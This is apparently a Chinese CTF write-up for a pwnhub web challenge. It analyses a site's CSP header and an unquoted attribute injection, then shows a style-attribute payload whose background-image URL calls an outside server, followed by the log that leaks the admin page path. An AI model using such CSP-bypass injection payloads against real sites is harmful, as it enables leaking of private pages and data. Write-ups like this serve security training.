---
title: pwnhub 打开电脑
date: 2017-02-20 02:15:46
tags:
- pwnhub
- xss
- csp
categories:
- Blogs
---

这是个比较特别的题目，开始上来逛了逛发现其实挺迷的...

<!--more-->

```
题目介绍

http://52.80.1.108:6666

2017.02.18 20:00:00没有SQL注入，仔细看CSP头。
2017.02.18 12:00:00管理员只爱看有意思的东西，谁关心bug啊哈哈哈哈。
```

看看站内的功能，min.php和max.php可以提交md5，会显示最大或者最小的md5，但是输入的地方存在正则，研究了一下发现不能输入任何符号，也就意味着这里不存在问题。

有个contact和report bug，content提交有趣的md5，但不同的是，没有正则提示，很多都提示提交成功，report bug就更是了，没任何check。

根据提示我们把report bug扔下，研究contact，先看看CSP

CSP
```
Content-Security-Policy: default-src *; img-src * data: blob:; frame-src 'self'; script-src 'self' cdn.bootcss.com 'unsafe-eval'; style-src 'self' cdn.bootcss.com 'unsafe-inline'; connect-src * wss:;
```


由于contact和minmax的功能相似，猜测后台的输出方式相似，所以仔细观察min.php，最奇怪的其实是输出点，输出点后没有引号包裹，也就意味着即便使用了htmlspecialchars过滤了"和<，但是我们仍然可以dom <del>xss</del>

```

 <a id="modal" class="detail" href="#detail" data-toggle="modal"
                           contributor=aaangelwhu hexdata=672e65613167722e333170366572657265726572657265>fffffffffffe53cdbc640fffb934cfb8</a>

```

但是一切的问题都在CSP，内联的脚本是不会被执行的，但这里有好多*啊

```
img-src *
style-src unsafe-inline
connect-src *
font-src *
media-src *
object-src *
```

style可以设置啊，然后style里有个<del>font-src可以随便设置</del>

关于字体的绕过方式，我仍然不知道是不是有效的，但我稍微尝试了下发现语法不同，也许是不熟悉吧，但我肯定是智障了，css可以设置背景图片啊，img-src是*啊，所以payload

```
aaang style=background-image:url('http://119.29.192.14')
```

收到了请求
```
115.159.200.107 - - [19/Feb/2017:03:21:31 +0800] "GET / HTTP/1.1" 304 0 "http://52.80.1.108:6666/d9aba78484e6d3325f88f0e8826191e9/admin.php" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
```


但想了一晚上为啥是404，我怕是智障了

![image_1b9a7v94vr64up1alh1jkcq3r9.png-102.8kB][1]

试到flag.php

![image_1b9a8efhs12qe1ktq124drc6podm.png-62.1kB][2]


  [1]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/oaum49esbcd46h8i0g2oni34/image_1b9a7v94vr64up1alh1jkcq3r9.png
  [2]: https://lorexxar-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/LoRexxar/g5bdewuyr3z0vmqbuwyrmonc/image_1b9a8efhs12qe1ktq124drc6podm.png